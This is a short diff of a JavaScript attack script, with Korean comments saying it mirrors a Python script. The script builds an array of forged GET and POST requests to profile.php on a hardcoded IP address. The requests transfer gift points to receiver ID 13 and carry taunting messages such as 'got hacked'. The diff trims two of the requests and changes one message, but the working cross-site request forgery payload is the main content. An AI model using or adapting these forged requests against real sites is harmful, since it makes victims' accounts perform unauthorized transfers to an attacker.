@@ -98,11 +98,7 @@
             
             // Python 스크립트와 동일한 공격 방법들
             const attacks = [
-                {
-                    method: 'GET',
-                    url: `http://15.164.94.241/profile.php?receiver_id=13&points=50&send_gift=1&message=bob자동전송`,
-                    points: 50
-                },
+                
                 {
                     method: 'POST',
                     url: 'http://15.164.94.241/profile.php',
@@ -123,20 +119,11 @@
                         points: '25',
                         gift_type: 'cake',
                         send_gift: '1',
-                        message: '털렸지롱'
+                        message: '내가 가져간다 이 대머리야'
                     },
                     points: 25
                 },
-                {
-                    method: 'POST',
-                    url: 'http://15.164.94.241/profile.php',
-                    data: {
-                        receiver_id: '13',
-                        points: '45',
-                        gift_type: 'diamond'
-                    },
-                    points: 45
-                }
+               
             ];
             
             let successCount = 0;
